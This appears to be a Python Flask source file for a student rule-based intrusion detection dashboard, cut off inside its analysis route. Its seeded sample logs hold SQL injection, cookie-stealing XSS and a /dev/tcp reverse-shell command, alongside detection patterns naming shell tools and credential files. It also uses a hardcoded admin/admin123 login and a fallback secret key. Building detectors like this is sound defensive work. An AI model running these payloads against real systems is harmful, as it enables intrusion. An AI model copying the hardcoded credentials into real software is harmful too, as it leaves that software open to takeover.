"""
=============================================================================
RULE-BASED INTRUSION DETECTION SYSTEM (IDS) - FLASK & SQLITE BACKEND
=============================================================================
A signature/rule-based cybersecurity monitoring system suitable for college
mini-projects and presentations. Built with Python Flask and SQLite.
No AI/ML is used; all detection is 100% deterministic, rule-based, and explainable.
=============================================================================
"""

import os
import re
import csv
import json
import sqlite3
from io import StringIO
from datetime import datetime
from functools import wraps
import ipaddress

from flask import (
    Flask, render_template, request, redirect,
    url_for, session, flash, jsonify, Response
)
from werkzeug.security import generate_password_hash, check_password_hash

# ---------------------------------------------------------------------------
# App Configuration
# ---------------------------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "cyber_ids_super_secret_key_2026_demo")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE_PATH = os.path.join(BASE_DIR, "ids_database.db")


# ---------------------------------------------------------------------------
# Database Initialization & Helpers
# ---------------------------------------------------------------------------
def get_db():
    """Connects to the SQLite database and configures row factory for dict-like access."""
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    """Initializes the database schema and seeds initial data if empty."""
    conn = get_db()
    cursor = conn.cursor()

    # 1. Users Table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # 2. Detection Logs Table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS detection_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT NOT NULL,
            dest_port INTEGER NOT NULL,
            protocol TEXT NOT NULL,
            payload TEXT,
            request_rate INTEGER DEFAULT 1,
            user_agent TEXT,
            risk_level TEXT NOT NULL,
            threat_score INTEGER DEFAULT 0,
            triggered_rules TEXT,
            action_taken TEXT,
            analyst_user TEXT
        )
    """)

    # Check and seed default admin user
    cursor.execute("SELECT id FROM users WHERE username = ?", ("admin",))
    if not cursor.fetchone():
        hashed = generate_password_hash("admin123")
        cursor.execute(
            "INSERT INTO users (username, password_hash) VALUES (?, ?)",
            ("admin", hashed)
        )

    # Check and seed sample detection logs if empty
    cursor.execute("SELECT COUNT(*) FROM detection_logs")
    count = cursor.fetchone()[0]
    if count == 0:
        sample_logs = [
            (
                "2026-10-18 20:15:22", "192.168.1.45", 443, "HTTPS",
                "GET /dashboard HTTP/1.1\nHost: corporate.internal", 4,
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Safe", 0, "[]",
                "PASS: Traffic evaluated as clean. | Reason: SAFE: Input evaluated as clean. No SQL injection (SELECT, UNION, ' OR '1'='1), XSS (<script>), or brute-force keywords (failed, unauthorized) detected.", "admin"
            ),
            (
                "2026-10-18 20:32:10", "10.0.0.18", 80, "HTTP",
                "GET /search?q=1' UNION SELECT username,password FROM users--", 8,
                "Mozilla/5.0 (Windows NT 10.0)",
                "High Risk", 95,
                json.dumps([
                    {
                        "id": "RULE-SQLI",
                        "name": "SQL Injection Attack (SQLi)",
                        "severity": "High Risk",
                        "matched": "SELECT, UNION, ' OR '1'='1'",
                        "reason": "Detected SQL Injection Signature: Found keywords 'UNION, SELECT' in payload. Attackers use SELECT and UNION to bypass authentication and dump database tables.",
                        "detail": "Detected SQL Injection Signature: Found keywords 'UNION, SELECT' in payload. Attackers use SELECT and UNION to bypass authentication and dump database tables."
                    }
                ]),
                "ALERT: Dropping packet and blocking source IP. | Reason: CRITICAL INTRUSION DETECTED: Found SQL Injection keywords 'UNION, SELECT' in payload.", "admin"
            ),
            (
                "2026-10-18 20:55:12", "172.16.5.99", 80, "HTTP",
                "GET /search?q=<script>alert('Cookie Stealer: ' + document.cookie)</script>", 5,
                "Mozilla/5.0 (X11; Linux x86_64)",
                "High Risk", 90,
                json.dumps([
                    {
                        "id": "RULE-XSS",
                        "name": "Cross-Site Scripting (XSS)",
                        "severity": "High Risk",
                        "matched": "<script>",
                        "reason": "Detected Cross-Site Scripting (XSS) Signature: Found '<script>' tag in input payload. Attackers inject executable browser scripts to hijack sessions.",
                        "detail": "Detected Cross-Site Scripting (XSS) Signature: Found '<script>' tag in input payload. Attackers inject executable browser scripts to hijack sessions."
                    }
                ]),
                "ALERT: Blocking request and sanitizing payload. | Reason: CRITICAL INTRUSION DETECTED: Injected HTML script tag '<script>' detected.", "admin"
            ),
            (
                "2026-10-18 21:20:15", "192.168.1.185", 80, "HTTP",
                "POST /auth/login HTTP/1.1\nstatus=failed&error=unauthorized access attempt for user admin", 45,
                "Mozilla/5.0 (Windows NT 10.0)",
                "Suspicious", 45,
                json.dumps([
                    {
                        "id": "RULE-BRUTEFORCE",
                        "name": "Brute-Force & Unauthorized Activity",
                        "severity": "Suspicious",
                        "matched": "'failed' and 'unauthorized'",
                        "reason": "Detected Brute-Force / Access Violation: Found keywords 'failed' and 'unauthorized' in event data (Request Rate: 45 req/min). Indicates repeated login failures or credential stuffing.",
                        "detail": "Detected Brute-Force / Access Violation: Found keywords 'failed' and 'unauthorized' in event data (Request Rate: 45 req/min). Indicates repeated login failures or credential stuffing."
                    }
                ]),
                "WARNING: Rate-limiting source and flagging for review. | Reason: SUSPICIOUS ACTIVITY FLAGGED: Found keywords 'failed' and 'unauthorized' in login stream.", "admin"
            ),
            (
                "2026-10-18 21:40:02", "192.168.1.112", 4444, "TCP",
                "/bin/sh -i >& /dev/tcp/192.168.1.112/4444 0>&1", 15,
                "Python-urllib/3.10",
                "High Risk", 100,
                json.dumps([
                    {
                        "id": "RULE-BACKDOOR-PORT",
                        "name": "Dangerous / Backdoor Port Probing",
                        "severity": "High Risk",
                        "matched": "Port 4444",
                        "reason": "Target port 4444 matches Metasploit Meterpreter reverse listener.",
                        "detail": "Target port 4444 matches Metasploit Meterpreter reverse listener."
                    }
                ]),
                "ALERT: Session Terminated & Port Filtered. | Reason: CRITICAL INTRUSION DETECTED: Backdoor port 4444 probe.", "admin"
            )
        ]

        cursor.executemany("""
            INSERT INTO detection_logs (
                timestamp, source_ip, dest_port, protocol, payload,
                request_rate, user_agent, risk_level, threat_score,
                triggered_rules, action_taken, analyst_user
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, sample_logs)

    conn.commit()
    conn.close()


# ---------------------------------------------------------------------------
# Predefined Rule-Based Intrusion Detection Engine
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Predefined Rule-Based Intrusion Detection Engine
# ---------------------------------------------------------------------------
# Strict deterministic signatures with zero AI/ML
RULE_CATALOG = [
    {
        "id": "RULE-SQLI",
        "name": "SQL Injection Attack (SQLi)",
        "category": "Web Application Attack",
        "severity": "High Risk",
        "score_weight": 55,
        "description": "Strictly identifies SQL syntax keywords (SELECT, UNION), tautologies (' OR '1'='1', ' OR 1=1), comment delimiters, and DROP commands used to hijack databases."
    },
    {
        "id": "RULE-XSS",
        "name": "Cross-Site Scripting (XSS)",
        "category": "Web Application Attack",
        "severity": "High Risk",
        "score_weight": 50,
        "description": "Strictly identifies injected HTML/JavaScript execution vectors (<script> tags, onerror handlers, javascript: pseudo-protocols) used to hijack client sessions."
    },
    {
        "id": "RULE-BRUTEFORCE",
        "name": "Brute-Force & Unauthorized Activity",
        "category": "Authentication & Access Control",
        "severity": "Suspicious / High Risk",
        "score_weight": 45,
        "description": "Strictly identifies authentication anomaly keywords ('failed', 'unauthorized') and elevated transaction frequencies indicating credential stuffing."
    },
    {
        "id": "RULE-IP-BLACKLIST",
        "name": "Threat Intelligence IP Blacklist",
        "category": "Threat Intelligence",
        "severity": "High Risk",
        "score_weight": 50,
        "description": "Matches known malicious C2 servers, botnet proxies, or brute-force scanning IPs."
    },
    {
        "id": "RULE-BACKDOOR-PORT",
        "name": "Dangerous / Backdoor Port Probing",
        "category": "Network Anomaly",
        "severity": "High Risk",
        "score_weight": 50,
        "description": "Detects traffic targeted at ports frequently used by trojans or reverse listeners (e.g. 4444, 31337, 1337)."
    },
    {
        "id": "RULE-TRAVERSAL",
        "name": "Path Traversal & System File Access",
        "category": "System Exploitation",
        "severity": "High Risk",
        "score_weight": 45,
        "description": "Identifies directory navigation tokens ('../') or attempts to view /etc/passwd, boot.ini, or cmd.exe."
    },
    {
        "id": "RULE-ADMIN-PORT",
        "name": "Suspicious Legacy / Administrative Port Access",
        "category": "Port Reconnaissance",
        "severity": "Suspicious",
        "score_weight": 25,
        "description": "Flags connections to high-risk administrative ports: Telnet (23), SMB (445/135), or RDP (3389)."
    },
    {
        "id": "RULE-SCANNER-AGENT",
        "name": "Automated Scanner Fingerprint",
        "category": "Reconnaissance",
        "severity": "Suspicious",
        "score_weight": 30,
        "description": "Matches User-Agent strings or headers belonging to tools like sqlmap, nikto, nmap, dirbuster, hydra."
    },
    {
        "id": "RULE-CMD-INJECTION",
        "name": "Command Injection & Reverse Shell",
        "category": "Arbitrary Code Execution",
        "severity": "High Risk",
        "score_weight": 55,
        "description": "Detects terminal command chaining (; rm, | bash, /bin/sh, powershell -enc) in payload content."
    }
]

# Blacklisted IPs (simulated threat intelligence feed)
BLACKLISTED_IPS = {
    "198.51.100.23",
    "203.0.113.55",
    "185.220.101.5",
    "45.154.255.89",
    "194.26.29.112",
    "185.191.171.12",
    "103.251.167.20"
}

# Regex and keyword patterns for SQL Injection
SQLI_REGEXES = [
    (r"('|\"|)\s*or\s*('|\")?1('|\")?\s*=\s*('|\")?1", "' OR '1'='1' (Authentication Bypass Tautology)"),
    (r"('|\")\s*or\s*('|\")[a-zA-Z0-9]+('|\")\s*=\s*('|\")[a-zA-Z0-9]+", "' OR 'a'='a' (SQL Logic Tautology)"),
    (r"\bunion\b\s+(\ball\b\s+)?\bselect\b", "UNION SELECT (Database Table Exfiltration)"),
    (r"\bselect\b\s+.*\bfrom\b", "SELECT ... FROM (SQL Query Statement)"),
    (r"\bdrop\b\s+\btable\b", "DROP TABLE (Data Destruction Command)"),
    (r"\binsert\b\s+\binto\b", "INSERT INTO (Unauthorized SQL Insertion)"),
    (r"\binformation_schema\b", "information_schema (Database Schema Reconnaissance)"),
    (r"(--|#|/\*).*", "-- / # (SQL Inline Comment Delimiter)")
]

# Regex and keyword patterns for Cross-Site Scripting (XSS)
XSS_REGEXES = [
    (r"<\s*script\b[^>]*>", "<script> (Executable HTML Script Tag)"),
    (r"<\s*/\s*script\s*>", "</script> (HTML Script End Tag)"),
    (r"javascript\s*:", "javascript: (Pseudo-Protocol URI Handler)"),
    (r"onerror\s*=", "onerror= (Malicious Inline Event Handler)"),
    (r"onload\s*=", "onload= (Malicious Inline Event Handler)"),
    (r"onclick\s*=", "onclick= (Malicious DOM Interaction Handler)"),
    (r"document\.cookie", "document.cookie (Browser Cookie/Session Theft Attempt)"),
    (r"alert\s*\(", "alert() (Proof-of-Concept Exploit Invocation)")
]

# Scanner tool signatures
SCANNER_SIGNATURES = [
    "sqlmap", "nikto", "nmap", "masscan",
    "dirbuster", "gobuster", "hydra",
    "metasploit", "acunetix", "nessus", "burpsuite"
]

CMD_INJECTION_PATTERNS = [
    r"/bin/(ba)?sh",
    r"\bpowershell(\.exe)?\b",
    r";\s*(rm|cat|ls|wget|curl)\b",
    r"\|\s*(ba)?sh\b",
    r">\s*&/dev/tcp",
    r"\bnc(\.exe)?\s+-e\b"
]


def evaluate_network_event(source_ip, dest_port, protocol, payload, request_rate, user_agent):
    """
    Strict 3-Category Rule-Based Threat Classification Logic:
    1. Safe (Green):
       - Normal traffic, standard HTTP requests, valid IP format with no malicious patterns.
    2. Suspicious (Yellow):
       - Contains keywords like: 'failed login', 'port scan', 'admin attempt',
         or multiple requests from an internal/unrecognized IP.
    3. High Risk / Critical (Red):
       - Contains malicious payloads like:
         - SQL Injection (SELECT, UNION, ' OR '1'='1)
         - Cross-Site Scripting (<script>, onerror=)
         - Unauthorized root/system commands (/etc/passwd, sudo)
         - Known malicious blacklisted IP / backdoor ports (4444)
    """
    triggered_rules = []
    threat_score = 0

    clean_ip = (source_ip or "").strip()
    try:
        port_num = int(dest_port)
    except (ValueError, TypeError):
        port_num = 80

    proto = (protocol or "TCP").upper().strip()
    text_payload = (payload or "").strip()
    rate = int(request_rate or 1)
    agent_str = (user_agent or "").strip()

    # Combined input text for inspection
    combined_search_text = f"{clean_ip} {text_payload} {agent_str}".strip()
    combined_lower = combined_search_text.lower()
    payload_lower = text_payload.lower()

    # IP format verification & internal subnet detection
    valid_ip = True
    is_internal_ip = False
    if clean_ip:
        try:
            ip_obj = ipaddress.ip_address(clean_ip)
            is_internal_ip = ip_obj.is_private
        except ValueError:
            valid_ip = False
    else:
        valid_ip = False

    # =========================================================================
    # 1. HIGH RISK / CRITICAL (RED)
    # Malicious payloads: SQLi (SELECT, UNION, ' OR '1'='1'),
    # XSS (<script>, onerror=), or unauthorized root/system commands (/etc/passwd, sudo).
    # =========================================================================

    # 1.A: SQL Injection (SELECT, UNION, ' OR '1'='1', ' OR 1=1, DROP TABLE, etc.)
    sqli_evidence = []
    if re.search(r"\bselect\b", text_payload, re.IGNORECASE):
        sqli_evidence.append("SELECT")
    if re.search(r"\bunion\b", text_payload, re.IGNORECASE):
        sqli_evidence.append("UNION")
    if (re.search(r"('|\"|)\s*or\s*('|\")?1('|\")?\s*=\s*('|\")?1", text_payload, re.IGNORECASE) or
        "' or '1'='1" in payload_lower or "' or 1=1" in payload_lower or "or '1'='1" in payload_lower):
        sqli_evidence.append("' OR '1'='1'")
    if re.search(r"\bdrop\b\s+\btable\b", text_payload, re.IGNORECASE):
        sqli_evidence.append("DROP TABLE")
    if re.search(r"\binsert\b\s+\binto\b", text_payload, re.IGNORECASE):
        sqli_evidence.append("INSERT INTO")
    if "information_schema" in payload_lower:
        sqli_evidence.append("information_schema")

    if sqli_evidence:
        matched_str = ", ".join(sqli_evidence[:3])
        reason = (
            f"Detected SQL Injection Payload: Found signature syntax '{matched_str}' in input. "
            f"Attackers use SQL commands (SELECT, UNION, ' OR '1'='1') to bypass authentication, "
            f"tamper with database logic, or dump confidential tables."
        )
        triggered_rules.append({
            "id": "RULE-SQLI",
            "name": "SQL Injection Attack (SQLi)",
            "category": "High Risk / Critical (Red)",
            "severity": "High Risk",
            "matched": matched_str,
            "reason": reason,
            "detail": reason
        })
        threat_score += 65

    # 1.B: Cross-Site Scripting (XSS) (<script>, onerror=, onload=, javascript:, alert)
    xss_evidence = []
    if (re.search(r"<\s*script\b[^>]*>", text_payload, re.IGNORECASE) or
        "<script>" in payload_lower or "</script>" in payload_lower or
        "&lt;script" in payload_lower):
        xss_evidence.append("<script>")
    if re.search(r"\bonerror\s*=", text_payload, re.IGNORECASE):
        xss_evidence.append("onerror=")
    if re.search(r"\bonload\s*=", text_payload, re.IGNORECASE):
        xss_evidence.append("onload=")
    if "javascript:" in payload_lower:
        xss_evidence.append("javascript:")
    if re.search(r"\balert\s*\(", text_payload, re.IGNORECASE):
        xss_evidence.append("alert()")

    if xss_evidence:
        matched_str = ", ".join(xss_evidence[:3])
        reason = (
            f"Detected Cross-Site Scripting (XSS) Payload: Found malicious client script tag/handler '{matched_str}' in input. "
            f"Script tags (<script>) and event handlers (onerror=) execute unauthorized browser JavaScript to hijack session cookies and tokens."
        )
        triggered_rules.append({
            "id": "RULE-XSS",
            "name": "Cross-Site Scripting (XSS)",
            "category": "High Risk / Critical (Red)",
            "severity": "High Risk",
            "matched": matched_str,
            "reason": reason,
            "detail": reason
        })
        threat_score += 60

    # 1.C: Unauthorized Root / System Commands (/etc/passwd, sudo, shell commands)
    sys_cmd_evidence = []
    if "/etc/passwd" in payload_lower or "/etc/shadow" in payload_lower:
        sys_cmd_evidence.append("/etc/passwd")
    if re.search(r"\bsudo\b", text_payload, re.IGNORECASE):
        sys_cmd_evidence.append("sudo")
    if (re.search(r"/bin/(ba)?sh", text_payload, re.IGNORECASE) or
        "cmd.exe" in payload_lower or "powershell" in payload_lower or
        re.search(r";\s*(rm|cat|ls|wget|curl)\b", text_payload, re.IGNORECASE) or
        re.search(r"\|\s*(ba)?sh\b", text_payload, re.IGNORECASE)):
        sys_cmd_evidence.append("System Command Execution")

    if sys_cmd_evidence:
        matched_str = ", ".join(sys_cmd_evidence[:3])
        reason = (
            f"Detected Unauthorized Root / System Command: Found restricted command/token '{matched_str}' in input. "
            f"Privilege escalation tools ('sudo'), sensitive system files ('/etc/passwd'), or shell execution pipes indicate active server takeover attempts."
        )
        triggered_rules.append({
            "id": "RULE-SYSTEM-CMD",
            "name": "Unauthorized Root / System Command Execution",
            "category": "High Risk / Critical (Red)",
            "severity": "High Risk",
            "matched": matched_str,
            "reason": reason,
            "detail": reason
        })
        threat_score += 65

    # 1.D: Blacklisted Threat IP or Dangerous Backdoor Ports (4444, 31337)
    if clean_ip in BLACKLISTED_IPS:
        reason = f"Detected Blacklisted Threat Host: Source IP '{clean_ip}' matches known botnet C2 / hostile scanner blocklist."
        triggered_rules.append({
            "id": "RULE-IP-BLACKLIST",
            "name": "Threat Intelligence IP Blacklist",
            "category": "High Risk / Critical (Red)",
            "severity": "High Risk",
            "matched": clean_ip,
            "reason": reason,
            "detail": reason
        })
        threat_score += 55

    if port_num in [4444, 31337, 1337]:
        reason = f"Detected Dangerous Backdoor Port: Destination port {port_num} matches known Metasploit shell or trojan listener."
        triggered_rules.append({
            "id": "RULE-BACKDOOR-PORT",
            "name": "Dangerous / Backdoor Port Probing",
            "category": "High Risk / Critical (Red)",
            "severity": "High Risk",
            "matched": f"Port {port_num}",
            "reason": reason,
            "detail": reason
        })
        threat_score += 50

    # =========================================================================
    # 2. SUSPICIOUS (YELLOW)
    # Keywords like failed login, port scan, admin attempt, or multiple requests
    # from an internal/unrecognized IP.
    # =========================================================================
    has_high_rule = any(r.get("severity") in ("High Risk", "High", "Critical") for r in triggered_rules)

    if not has_high_rule:
        # 2.A: Failed Login Keyword Check
        if ("failed login" in payload_lower or
            ("failed" in payload_lower and "login" in payload_lower) or
            "login failed" in payload_lower):
            reason = (
                "Detected Failed Login Activity: Found keyword 'failed login' in event details. "
                "Indicates authentication errors, credential guessing, or brute-force access attempts."
            )
            triggered_rules.append({
                "id": "RULE-FAILED-LOGIN",
                "name": "Suspicious Activity: Failed Login Attempt",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": "failed login",
                "reason": reason,
                "detail": reason
            })
            threat_score += 40

        # 2.B: Port Scan Keyword & Activity Check
        elif ("port scan" in payload_lower or "portscan" in payload_lower or
              "nmap" in payload_lower or "syn scan" in payload_lower or
              "stealth scan" in payload_lower or "masscan" in payload_lower):
            reason = (
                "Detected Port Scan Activity: Found keyword 'port scan' or scanner tool signature in event payload. "
                "Indicates active network reconnaissance and port discovery probing."
            )
            triggered_rules.append({
                "id": "RULE-PORT-SCAN",
                "name": "Suspicious Activity: Port Scan / Reconnaissance",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": "port scan",
                "reason": reason,
                "detail": reason
            })
            threat_score += 40

        # 2.C: Admin Attempt Keyword Check
        elif ("admin attempt" in payload_lower or "admin login" in payload_lower or
              "/admin" in payload_lower or "admin probe" in payload_lower or
              "/wp-admin" in payload_lower or "admin access" in payload_lower or
              "administrator access" in payload_lower):
            matched_kw = "admin attempt" if "admin attempt" in payload_lower else "/admin"
            reason = (
                f"Detected Admin Attempt: Found sensitive administrative access keyword '{matched_kw}' in payload. "
                f"Indicates unauthorized probing of management interfaces or configuration portals."
            )
            triggered_rules.append({
                "id": "RULE-ADMIN-ATTEMPT",
                "name": "Suspicious Activity: Admin Access Attempt",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": matched_kw,
                "reason": reason,
                "detail": reason
            })
            threat_score += 40

        # 2.D: Multiple Requests from internal / unrecognized IP Check
        elif (rate > 20) or (is_internal_ip and rate > 10) or ("multiple requests" in payload_lower):
            reason = (
                f"Detected Multiple Rapid Requests Anomaly: Recorded {rate} req/min from IP '{clean_ip}' "
                f"({'Internal Subnet' if is_internal_ip else 'External Host'}). Exceeds standard human browsing threshold, "
                f"indicating automated scraping or DoS flood behavior."
            )
            triggered_rules.append({
                "id": "RULE-MULTIPLE-REQUESTS",
                "name": "Suspicious Activity: Multiple Requests / Rate Anomaly",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": f"{rate} req/min from {clean_ip}",
                "reason": reason,
                "detail": reason
            })
            threat_score += 35

        # 2.E: General failed / unauthorized keywords
        elif "failed" in payload_lower or "unauthorized" in payload_lower:
            matched_kw = "failed" if "failed" in payload_lower else "unauthorized"
            reason = f"Detected Access Violation Keyword: Found keyword '{matched_kw}' indicating authentication or authorization errors."
            triggered_rules.append({
                "id": "RULE-ACCESS-VIOLATION",
                "name": "Suspicious Activity: Access Violation Indicator",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": matched_kw,
                "reason": reason,
                "detail": reason
            })
            threat_score += 30

        # 2.F: Unrecognized / Malformed IP check
        elif not valid_ip and clean_ip:
            reason = f"Detected Unrecognized / Malformed IP Format: '{clean_ip}' does not conform to valid IPv4/IPv6 standards."
            triggered_rules.append({
                "id": "RULE-INVALID-IP",
                "name": "Suspicious Activity: Unrecognized IP Format",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": clean_ip,
                "reason": reason,
                "detail": reason
            })
            threat_score += 25

        # 2.G: Exposed Administrative Services (Ports 23, 135, 445, 3389)
        elif port_num in [23, 135, 445, 3389]:
            reason = f"Detected Exposed Administrative Port Probe: Inbound connection directed to sensitive port {port_num} (Telnet/SMB/RDP)."
            triggered_rules.append({
                "id": "RULE-ADMIN-PORT",
                "name": "Suspicious Administrative Port Access",
                "category": "Suspicious (Yellow)",
                "severity": "Suspicious",
                "matched": f"Port {port_num}",
                "reason": reason,
                "detail": reason
            })
            threat_score += 30

    # =========================================================================
    # 3. SAFE (GREEN)
    # Normal traffic, standard HTTP requests, valid IP format with no malicious patterns.
    # =========================================================================
    threat_score = min(threat_score, 100)
    has_high = any(r.get("severity") in ("High Risk", "High", "Critical") for r in triggered_rules)
    has_suspicious = any(r.get("severity") == "Suspicious" for r in triggered_rules)

    if has_high or threat_score >= 50:
        risk_level = "High Risk"
        matched_rule = triggered_rules[0]["name"] if triggered_rules else "High Risk Intrusion"
        reasons_list = [r["reason"] for r in triggered_rules if r.get("severity") in ("High Risk", "High", "Critical")]
        primary_reason = "CRITICAL INTRUSION DETECTED: " + " | ".join(reasons_list)
        action_taken = "ALERT: Critical malicious intrusion detected! Dropping packet and blocking source IP in firewall."
    elif has_suspicious or threat_score >= 20 or len(triggered_rules) > 0:
        risk_level = "Suspicious"
        matched_rule = triggered_rules[0]["name"] if triggered_rules else "Suspicious Activity"
        reasons_list = [r["reason"] for r in triggered_rules]
        primary_reason = "SUSPICIOUS ACTIVITY FLAGGED: " + " | ".join(reasons_list)
        action_taken = "WARNING: Suspicious behavior detected. Applying rate limiting and logging for SOC review."
    else:
        risk_level = "Safe"
        threat_score = 0
        matched_rule = "Authorized Clean Traffic Baseline"
        primary_reason = (
            "SAFE: Normal traffic verified. Standard HTTP request, valid IP format, and zero malicious patterns "
            "(No SQLi, XSS, root/system commands, failed logins, port scans, or admin attempts detected)."
        )
        action_taken = "PASS: Traffic evaluated as clean and authorized. No threat signatures identified."

    return {
        "risk_level": risk_level,
        "threat_score": threat_score,
        "matched_rule": matched_rule,
        "triggered_rules": triggered_rules,
        "primary_reason": primary_reason,
        "action_taken": action_taken
    }


# ---------------------------------------------------------------------------
# Authentication Helper Decorator
# ---------------------------------------------------------------------------
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if "user" not in session:
            flash("Please sign in to access the IDS Cyber Dashboard.", "warning")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    if "user" in session:
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if "user" in session:
        return redirect(url_for("dashboard"))

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()
        conn.close()

        if user and check_password_hash(user["password_hash"], password):
            session["user"] = user["username"]
            flash(f"Welcome back, Analyst {user['username']}. SOC Engine Online.", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Invalid credentials. Try demo credentials: admin / admin123", "danger")

    return render_template("login.html")


@app.route("/logout")
def logout():
    session.pop("user", None)
    flash("Analyst signed out successfully.", "info")
    return redirect(url_for("login"))


@app.route("/dashboard")
@login_required
def dashboard():
    conn = get_db()
    cursor = conn.cursor()

    # Get aggregate statistics
    cursor.execute("SELECT COUNT(*) FROM detection_logs")
    total_scans = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM detection_logs WHERE risk_level = 'High Risk'")
    high_risk_count = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM detection_logs WHERE risk_level = 'Suspicious'")
    suspicious_count = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM detection_logs WHERE risk_level = 'Safe'")
    safe_count = cursor.fetchone()[0]

    # Threat detection rate calculation
    threat_rate = 0
    if total_scans > 0:
        threat_rate = round(((high_risk_count + suspicious_count) / total_scans) * 100, 1)

    # Fetch recent 8 events for dashboard activity stream
    cursor.execute("""
        SELECT * FROM detection_logs
        ORDER BY timestamp DESC
        LIMIT 8
    """)
    recent_events = cursor.fetchall()

    # Fetch top high-risk alerts
    cursor.execute("""
        SELECT * FROM detection_logs
        WHERE risk_level = 'High Risk'
        ORDER BY timestamp DESC
        LIMIT 5
    """)
    critical_alerts = cursor.fetchall()

    # Categorize each unique IP address into Safe, Suspicious, or High Risk
    cursor.execute("""
        SELECT 
            source_ip,
            COUNT(*) as total_events,
            MAX(threat_score) as max_score,
            MAX(timestamp) as last_seen,
            CASE 
                WHEN SUM(CASE WHEN risk_level = 'High Risk' THEN 1 ELSE 0 END) > 0 THEN 'High Risk'
                WHEN SUM(CASE WHEN risk_level = 'Suspicious' THEN 1 ELSE 0 END) > 0 THEN 'Suspicious'
                ELSE 'Safe'
            END as ip_category
        FROM detection_logs
        GROUP BY source_ip
        ORDER BY max_score DESC, total_events DESC
    """)
    ip_rows = cursor.fetchall()
    categorized_ips = [dict(row) for row in ip_rows]
    safe_ips = [ip for ip in categorized_ips if ip["ip_category"] == "Safe"]
    suspicious_ips = [ip for ip in categorized_ips if ip["ip_category"] == "Suspicious"]
    high_risk_ips = [ip for ip in categorized_ips if ip["ip_category"] == "High Risk"]

    conn.close()

    # Parse JSON rules for each event
    parsed_recent = []
    for event in recent_events:
        item = dict(event)
        try:
            item["rules_list"] = json.loads(item["triggered_rules"]) if item["triggered_rules"] else []
        except Exception:
            item["rules_list"] = []
        parsed_recent.append(item)

    parsed_alerts = []
    for alert in critical_alerts:
        item = dict(alert)
        try:
            item["rules_list"] = json.loads(item["triggered_rules"]) if item["triggered_rules"] else []
        except Exception:
            item["rules_list"] = []
        parsed_alerts.append(item)

    return render_template(
        "dashboard.html",
        user=session.get("user"),
        total_scans=total_scans,
        high_risk_count=high_risk_count,
        suspicious_count=suspicious_count,
        safe_count=safe_count,
        threat_rate=threat_rate,
        recent_events=parsed_recent,
        critical_alerts=parsed_alerts,
        categorized_ips=categorized_ips,
        safe_ips=safe_ips,
        suspicious_ips=suspicious_ips,
        high_risk_ips=high_risk_ips,
        rule_catalog_count=len(RULE_CATALOG)
    )


@app.route("/analyze", methods=["POST"])
@login_required
def analyze():
    # Support both AJAX JSON and Form submissions
    if request.is_json:
        data = request.get_json()
        source_ip = data.get("source_ip", "").strip()
        dest_port = data.get("dest_port", 80)
        protocol = data.get("protocol", "TCP").strip()
        payload = data.get("payload", "").strip()
        request_rate = data.get("request_rate", 1)
        user_agent = data.get("user_agent", "").strip()
    else:
        source_ip = request.form.get("source_ip", "").strip()
        dest_port = request.form.get("dest_port", 80)
        protocol = request.form.get("protocol", "TCP").strip()
        payload = request.form.get("payload", "").strip()
        request_rate = request.form.get("request_rate", 1)
        user_agent = request.form.get("user_agent", "").strip()

    if not source_ip:
        if request.is_json:
            return jsonify({"error": "Source IP Address is required."}), 400
        flash("Source IP Address is required.", "danger")
        return redirect(url_for("dashboard"))

    # Execute Rule Engine
    result = evaluate_network_event(
        source_ip=source_ip,
        dest_port=dest_port,
        protocol=protocol,
        payload=payload,
        request_rate=request_rate,
        user_agent=user_agent
    )

    # Save to SQLite Database
    conn = get_db()
    cursor = conn.cursor()
    log_action = f"{result['action_taken']} | Reason: {result['primary_reason']}"
    cursor.execute("""
        INSERT INTO detection_logs (
            source_ip, dest_port, protocol, payload, request_rate,
            user_agent, risk_level, threat_score, triggered_rules,
            action_taken, analyst_user
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        source_ip,
        dest_port,
        protocol,
        payload,
        request_rate,
        user_agent,
        result["risk_level"],
        result["threat_score"],
        json.dumps(result["triggered_rules"]),
        log_action,
        session.get("user", "admin")
    ))
    conn.commit()
    conn.close()

    if request.is_json:
        return jsonify({
            "status": "success",
            "source_ip": source_ip,
            "dest_port": dest_port,
            "protocol": protocol,
            "payload": payload,
            "request_rate": request_rate,
            "user_agent": user_agent,
            "risk_level": result["risk_level"],
            "ip_category": result["risk_level"],
            "threat_score": result["threat_score"],
            "matched_rule": result["matched_rule"],
            "triggered_rules": result["triggered_rules"],
